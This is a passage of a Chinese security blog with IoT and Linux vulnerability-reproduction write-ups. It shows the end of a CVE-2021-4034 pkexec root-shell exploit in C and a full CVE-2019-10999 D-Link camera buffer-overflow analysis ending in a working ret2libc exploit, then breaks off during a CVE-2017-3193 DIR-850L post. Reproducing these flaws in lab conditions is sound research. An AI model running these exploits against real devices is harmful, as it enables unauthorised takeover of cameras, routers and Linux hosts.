class="built_in">fprintf</span>(fp, <span class="string">&quot;module  UTF-8//    INTERNAL    ../payload    2\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[~] maybe get shell now?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, a_argv, a_envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行截图：</p>
<p><img src="/images/image-2023-0412-185754349.png" alt="undifined"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/joeammond/CVE-2021-4034">[Github] CVE-2021-4034</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/321066.html">[freebuf] CVE-2021-4034 Linux Polkit 权限提升漏洞挖掘思路解读</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10870">[先知社区] CVE-2021-4034 深入分析及漏洞复现</a></li>
<li><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/876.html">CVE-2021-4034 pkexec提权漏洞分析</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859">[CSDN] 使用GCONV_PATH与iconv进行bypass disable_functions</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2019-10999%20dlink%20ip%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/12/CVE-2019-10999%20dlink%20ip%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">CVE-2019-10999 dlink ip摄像头缓冲区溢出漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-12 06:46:43 / Modified: 18:53:51" itemprop="dateCreated datePublished" datetime="2023-04-12T06:46:43+08:00">2023-04-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2019-10999 是 Dlink IP 摄像头的后端服务器程序 alphapd 中的一个缓冲区溢出漏洞，漏洞允许经过身份认证的用户在请求 wireless.htm 时，传入 WEPEncryption 参数一个长字符串来执行任意代码。具体描述以及受攻击的型号、固件版本可以查看参考链接，此处漏洞复现采用的是设备 dcs-932l 固件版本 1.14.04，固件下载链接查看参考链接。</p>
<p>对后端服务器程序 alphapd 进行分析，存在漏洞的函数是 sub_435DEC，开辟的栈帧大小是 0x48，其中该函数的返回地址保存在 sp + 0x40，存在溢出的缓冲区起始地址是 sp + 0x18。因此，只需要向缓冲区写入超过 0x28 个字节就可以溢出覆盖返回地址，劫持控制流。除此之外还可以控制 S0~S5 寄存器。</p>
<p>如下是 sub_435DEC 栈帧的开辟以及返回地址的存储汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00435DEC li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)</span><br><span class="line">.text:00435DF4 addu    $gp, $t9</span><br><span class="line">.text:00435DF8 addiu   $sp, -0x48</span><br><span class="line">.text:00435DFC sw      $ra, 0x28+var_s18($sp)</span><br><span class="line">.text:00435E00 sw      $s5, 0x28+var_s14($sp)</span><br><span class="line">.text:00435E04 sw      $s4, 0x28+var_s10($sp)</span><br><span class="line">.text:00435E08 sw      $s3, 0x28+var_sC($sp)</span><br><span class="line">.text:00435E0C sw      $s2, 0x28+var_s8($sp)</span><br><span class="line">.text:00435E10 sw      $s1, 0x28+var_s4($sp)</span><br><span class="line">.text:00435E14 sw      $s0, 0x28+var_s0($sp)</span><br><span class="line">.text:00435E18 sw      $gp, 0x28+var_18($sp)</span><br></pre></td></tr></table></figure>

<p>如下是调用 strcpy 函数复制数据到栈上的缓冲区中，strcpy 的第一个参数 des 通过 a0 寄存器传入，由于跳转延迟槽，对 a0 的操作指令在 jalr 指令之后，但是先于跳转指令执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00435F98 loc_435F98:                              # CODE XREF: sub_435DEC+134↑j</span><br><span class="line">.text:00435F98 la      $t9, strcpy</span><br><span class="line">.text:00435F9C move    $a1, $s1</span><br><span class="line">.text:00435FA0 jalr    $t9 ; strcpy</span><br><span class="line">.text:00435FA4 addiu   $a0, $sp, 0x18</span><br><span class="line">.text:00435FA8 lw      $gp, 0x28+var_18($sp)</span><br><span class="line">.text:00435FAC b       loc_435E98</span><br><span class="line">.text:00435FB0 nop</span><br></pre></td></tr></table></figure>

<p>如下是函数执行完毕进行堆栈平衡，以及恢复 S0~S5寄存器、恢复 ra 寄存器到函数返回地址并跳转执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0004BF34 loc_4BF34:</span><br><span class="line">.text:0004BF34 				lw      $ra, 0x28+var_s14($sp)</span><br><span class="line">.text:0004BF38 				lw      $s4, 0x28+var_s10($sp)</span><br><span class="line">.text:0004BF3C 				lw      $s3, 0x28+var_sC($sp)</span><br><span class="line">.text:0004BF40 				lw      $s2, 0x28+var_s8($sp)</span><br><span class="line">.text:0004BF44 				lw      $s1, 0x28+var_s4($sp)</span><br><span class="line">.text:0004BF48 				lw      $s0, 0x28+var_s0($sp)</span><br><span class="line">.text:0004BF4C 				jr      $ra</span><br><span class="line">.text:0004BF50 				addiu   $sp, 0x40</span><br><span class="line">.text:0004BF50  # End of function system</span><br></pre></td></tr></table></figure>

<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><h3 id="使用-qemu-system-static-搭建"><a href="#使用-qemu-system-static-搭建" class="headerlink" title="使用 qemu-system-static 搭建"></a>使用 qemu-system-static 搭建</h3><p>漏洞环境搭建先是使用 qemu-mipsel-static 搭建。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 进入固件的根目录 复制 qemu-mipsel-static 到根目录</span><br><span class="line">cp $(which qemu-mipsel-static) ./</span><br><span class="line"># 使用 qemu 启动服务器 alphapd</span><br><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/alphapd</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-184727655.png" alt="undifined"></p>
<p>根据逆向中的反编译代码提示，是因为需要打开 &#x2F;var&#x2F;run&#x2F;nvramd.pid 文件，那么在固件根目录创建 run 目录和 nvramd.pid 文件。</p>
<p>创建 pid 文件之后，继续运行依旧报错，无法创建 RSA 密钥，应该是缺少 urandom、random 设备造成的，手动在固件根目录创建。</p>
<p><img src="/images/image-2023-0412-184754978.png" alt="undifined"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/random c 1 8</span><br><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/urandom c 1 9</span><br></pre></td></tr></table></figure>

<p><strong>报错 unable to write ‘random state’</strong></p>
<p><img src="/images/image-2023-0412-184812215.png" alt="undifined"></p>
<p>OpenSSL 需要写入一些信息到 .rnd 文件，上面的错误可能是因为 .rnd 文件不存在，OpenSSL 不知道默认文件在何处，因为 RANDFILE 和 HOME 环境变量没有设置，那么解决方法就是创建 .rnd 文件并且设置环境变量指向这个文件。qemu 启动的时候设置这两个环境变量，解决了上面的问题。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch .rnd</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E HOME=/ -E RANDFILE=/.rnd ./bin/alphapd</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-184826317.png" alt="undifined"></p>
<p><strong>Can’t get lan ip from sysinfo</strong></p>
<p>通过搜索字符串定位到在 websStartupServer 函数中，通过调用 getSysInfoLong 获取，在 getSysInfoLong 函数中是通过 &#x2F;dev&#x2F;gpio 设备获取到，可以通过 patch getSysInfoLong 函数，或者在 websStartupServer 中 patch 地址判定代码。此处选择 patch 后者，就可以让程序在 0.0.0.0:80 端口运行起来。</p>
<p>如下是 websStartupServer  的地址判定处反编译，以及 patch 的基本块：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v3 = getSysInfoLong(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v3</span><br><span class="line">  &amp;&amp; (v5 = (<span class="type">const</span> <span class="type">char</span> *)nvram_bufget(<span class="number">0</span>, <span class="string">&quot;IPAddress&quot;</span>),</span><br><span class="line">      trace(<span class="number">0</span>, <span class="string">&quot;Can&#x27;t get lan ip from sysinfo!\n&quot;</span>, v4),</span><br><span class="line">      v3 = inet_addr(v5),</span><br><span class="line">      v3 == <span class="number">-1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  trace(<span class="number">0</span>, <span class="string">&quot;failed to convert %s to binary ip data&quot;</span>, v5);</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v6 = inet_ntoa(v3);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-184918114.png" alt="undifined"></p>
<p>重新运行如下：</p>
<p><img src="/images/image-2023-0412-184935970.png" alt="undifined"></p>
<p><img src="/images/image-2023-0412-184949952.png" alt="undifined"></p>
<h3 id="使用-qemu-system-mipsel-搭建"><a href="#使用-qemu-system-mipsel-搭建" class="headerlink" title="使用 qemu-system-mipsel 搭建"></a>使用 qemu-system-mipsel 搭建</h3><p>发现使用 qemu 搭建的调试，使用 gdb-multiarch 连接不上去，于是采用了 qemu-system-mipsel 虚拟机来搭建，进入固件根目录。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chroot . /bin/mknod -m 0666 /dev/random c 1 8</span><br><span class="line">chroot . /bin/mknod -m 0666 /dev/urandom c 1 9</span><br><span class="line"></span><br><span class="line">touch .rnd</span><br><span class="line">export HOME=.</span><br><span class="line">export RANDFILE=$HOME/.rnd</span><br><span class="line"></span><br><span class="line">chroot . ./bin/alphapd_patch_j</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-185007135.png" alt="undifined"></p>
<p><img src="/images/image-2023-0412-185021356.png" alt="undifined"></p>
<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>漏洞触发代码如下，也可以看到成功触发了 segment fault。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">Headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;http://192.168.100.2/setSystemWireless&#x27;,</span><br><span class="line">    &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">data = &#x27;?WEPEncryption=&#x27; + &#x27;A&#x27; * 0x28 + &#x27;B&#x27; * 0x4</span><br><span class="line">res = session.get(url=&#x27;http://192.168.100.2/wireless.htm&#x27; + data, headers=Headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-185041489.png" alt="undifined"></p>
<p>在 QEMU 虚拟机中开启 alphapd，然后使用 gdbserver attach 上 server 的进程，通过 12345 端口提供调试</p>
<p><img src="/images/image-2023-0412-185058909.png" alt="undifined"></p>
<p>使用 gdb 调试，如下，保存在栈上的函数返回地址被 BBBB 字符串覆盖</p>
<p><img src="/images/image-2023-0412-185247615.png" alt="undifined"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>接下来的步骤就是寻找环视 的 gadget，从栈中获取数据设置 system 函数传入的命令，并跳转到 system 函数执行。</p>
<p>这个地方需要说一下，不能在 alphapd 中去直接寻找 gadget，因为 alphapd 的代码段装载在低地址空间，其中的 gadget 地址高位前两位是 00，通过 url 传递地址会发生截断。因此可以先看 alphapd 装载了哪些 so 文件，从 so 中去寻找 system 函数和 gadget。此处选择了 libuClibc-0.9.28.so ，因为通过 ldd 查看 alphapd 装载的 so 文件，其中有 libc.so，libc.so 链接指向 libuClibc-0.9.28.so。</p>
<p>这个地方是在 QEMU 虚拟机中通过查看 map 文件获取 ibuClibc-0.9.28.so 的装载地址的，如果在实际应用中，需要能够进入设备，从设备上查看 so 的装载地址以及是否开启了随机化，但是一般低端路由器中都是比较老的 Linux 系统，没有地址随机化，那么在 QEMU 中也关闭了地址随机化。此处选择了第一个装载的 libc.so.0 的基址：0x77ed0000</p>
<p>然后获取到 system 函数相对装载地址的偏移是 0x0004BD20，得到 system 函数的地址为 0x77ed0000 + 0x0004BD20 &#x3D; 0x77F1BD20</p>
<p>在 IDA 中，对 ibuClibc-0.9.28.so 使用 mipsrop.stackfinder()，找到如下的 gadget，同样计算出地址为 0x77ed0000 + 0x00050DE4 &#x3D; 0x77F20DE4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00050DE4 addiu   $s2, $sp, 0x1C8+var_D8</span><br><span class="line">.text:00050DE8 move    $a0, $s2</span><br><span class="line">.text:00050DEC move    $t9, $s0</span><br><span class="line">.text:00050DF0 jalr    $t9 ; </span><br></pre></td></tr></table></figure>

<p>gadgets 的功能是将 sp + 0x1c8 - 0xd8 处数据传递给 a0，然后跳转到 S0 寄存器中去执行。通过前面对于缓冲区溢出的分析知道 S0 可控，写入 0x10 个字节开始控制 S0 寄存器，写入 0x28 个字节开始控制返回地址。那么整体的利用过程就是：</p>
<ul>
<li>写入累计 0x10 个字节后，控制 S0 寄存器值为 system 函数地址</li>
<li>写入累计 0x28 个字节后，控制 ra 寄存器值为 gadget 地址</li>
<li>跳转到 system 函数，执行构造的字符串命令。此时已经恢复了堆栈， 从恢复的 sp + 0x1c8 - 0xd8 取出命令开始执行</li>
</ul>
<p>exp 根据 poc 简单修改如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://192.168.100.2/setSystemWireless&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">data = <span class="string">&#x27;?WEPEncryption=&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;%20%BD%F1%77&#x27;</span> + <span class="string">&#x27;B&#x27;</span> * (<span class="number">0x28</span> - <span class="number">0x10</span> - <span class="number">0x4</span>) + <span class="string">&#x27;%E4%0D%F2%77&#x27;</span> + (<span class="number">0x30</span> - <span class="number">0x28</span> - <span class="number">0x4</span> + <span class="number">0x1c8</span> - <span class="number">0xd8</span>) * <span class="string">&#x27;C&#x27;</span> + <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">res = session.get(url=<span class="string">&#x27;http://192.168.100.2/wireless.htm&#x27;</span> + data, headers=Headers)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>执行结果如下，执行命令 ls</p>
<p><img src="/images/image-2023-0412-185122923.png" alt="undifined"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文先分析了漏洞原理，然后分别从 qemu 的两种方式仿真将 alphapd 启动起来进行调试，然后通过 ret2libc 对漏洞实现利用。</p>
<p>漏洞原理还是比较简单的，仅仅是一个缓冲区溢出 + ret2libc的操作。但是实际利用的话，也许还需要获得设备，通过其他方式例如 UART 等先获取到一个 shell，然后看程序的 so 加载内存布局获取到基址。此外，漏洞是将路由器后端 server 发生了栈溢出的，触发 segment fault，如果路由器没有对 server 的守护进程或者看门狗，那么 server 就挂了。如果要稳定利用，可以考虑反弹一个 telnet 回来或者是在 exp 中通过 shellcode 重新启动 server。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10999">[cve.mitre.org] CVE-2019-10999 概述</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5681">[先知社区] CVE-2019-10999复现</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/tacnetsol/CVE-2019-10999">[github] CVE-2019-10999</a></li>
<li>[[固件下载] DCS-932L_REVA_FIRMWARE_1.14.04.ZIP](<a target="_blank" rel="noopener" href="https://us.softpedia-secure-download.com/dl/1987a9330e759255a393a795437da31e/61839716/300596532/drivers/network">https://us.softpedia-secure-download.com/dl/1987a9330e759255a393a795437da31e/61839716/300596532/drivers/network</a> camera&#x2F;DCS-932L_REVA_FIRMWARE_1.14.04.ZIP)</li>
<li><a target="_blank" rel="noopener" href="https://bobcares.com/blog/openssl-unable-to-write-random-state-unable-to-write-random-state/">How to fix openssl error “unable to write ‘random state’”?</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2017-3193%20dir-850l%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/12/CVE-2017-3193%20dir-850l%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">CVE-2017-3193 dir-850l缓冲区溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-12 06:41:22 / Modified: 18:44:49" itemprop="dateCreated datePublished" datetime="2023-04-12T06:41:22+08:00">2023-04-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h2><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞的产生是因为 hnap_main 函数中在拼接字符串的时候，没有对源字符串和目的字符串的大小进行限制，导致栈溢出。如下是 strcat 的函数原型。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>dest：目的字符串指针</li>
<li>src：源字符串指针</li>
</ul>
<p>strcat 函数将 src 指向的字符串复制到 dest 字符串尾部，dest 原本末尾的 NULL 结束符被覆盖，并在连接完 src 字符串后重新加上 NULL 字符串。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcat</span>(v74, v4);</span><br></pre></td></tr></table></figure>

<p>漏洞发生在如上代码，其中 v74 是栈上的内存空间，起始地址为 sp + 0xB30，v4 是获取到的环境变量 HTTP_SOAPACTION 的地址，存放在 _start 函数的栈中。在逆向 hnap_main 函数，初始化的过程是将调用返回地址（存放在 ra 寄存器中）保存到栈上 sp + 0xD34 + 0x20。通过计算，可以得出 v74 起始地址相对于栈上的返回地址偏移是 0x224 也就是 548 个字节大小，那么通过控制环境变量字符串的大小，就可以覆盖掉返回地址。</p>
<h2 id="环境搭建-FirmAE"><a href="#环境搭建-FirmAE" class="headerlink" title="环境搭建 FirmAE"></a>环境搭建 FirmAE</h2><p>对于 IoT 尤其是路由器仿真环境的搭建，这个地方强烈安利一个框架那就是 FirmAE。FirmAE 是一个仿真成功率比较高的框架，也是基于 Firmadyne 开发的，开发者声称可以达到 79.36% 的成功率，而以往使用比较多的 Firmadyne 在相同固件测试集是 16.28%。这些成功率都分别是各自的论文数据支撑，有感兴趣的师傅可以去翻看一下。</p>
<p>FirmAE 的安装步骤可以参考 GitHub 上的帮助文档，此处不多说了，主要是想说一下他的一个 debug 选项，可以极大减少环境搭建时间。平常手动搭建 qemu 系统级仿真环境，主要是解压固件，配置网络，然后上传对应架构的 gdbserver，如果是程序对于硬件、网络的一些依赖，还需要手动去 patch。但是 FirmAE 框架中对这些操作进行了集成。下面说一下具体的使用方法。</p>
<p>如果是仿真的话，先将固件（未加密可被 binwalk 正常解压）复制到 FirmAE 根目录的 firmwares 文件夹中，然后使用 run.sh 进行操作，例如下面是对 dir-850 的仿真步骤：</p>
<p><img src="/images/image-2023-0412-184204018.png" alt="undifined"></p>
<p>需要说明一下 -r 后的参数指的是固件的品牌，例如 dir 系列、netgear 系列等等。然后使用浏览器访问 192.168.0.1 就可以访问到路由器界面了。</p>
<p><img src="/images/image-2023-0412-184219976.png" alt="undifined"></p>
<p>仿真的流程通过脚本的输出可以看到，和手动搭建系统级仿真环境类似，是解压固件获取相关信息，创建虚拟机和宿主机的桥接网络，然后仿真。</p>
<p>如上是单纯搭建仿真环境而已，接下来要说一下 FirmAE 提供的一个超级实用的技能，那就是调试选项 -d，如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./run.sh -d dir firmwares/DIR850LB1_FW207WWb05</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0412-184233481.png" alt="undifined"></p>
<p>如上图，-d 选项提供了连接到 socat、shell、tcpdump 甚至 gdbserver 也集成到里面了，那就不需要再像以前那样手动去搭建系统级环境。为了调试的方便，我写了一个 shell 脚本上传到虚拟机中，设置调试 cgibin 所需要的环境变量，循环检测 gdbserver 是否已经挂掉等等。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/firmadyne/sh</span></span><br><span class="line">export REQUEST_METHOD=POST</span><br><span class="line">export HTTP_HNAP_AUTH=&quot;BBD0605AF8690024AF8568BE88DD7B8E 1482588069&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=OLnLaWBI8S&quot;</span><br><span class="line">export HTTP_REFERER=&quot;http://192.168.0.1/info/Login.html&quot;</span><br><span class="line">export 